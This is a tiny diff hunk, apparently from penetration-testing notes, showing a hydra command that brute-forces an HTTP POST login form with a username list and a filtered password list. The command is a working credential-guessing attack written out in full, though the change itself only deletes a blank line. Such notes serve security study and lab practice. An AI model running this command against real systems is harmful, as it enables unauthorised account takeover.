@@ -32,4 +32,3 @@ Apply user list and password list
 ```shell-session
 hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 ```
-
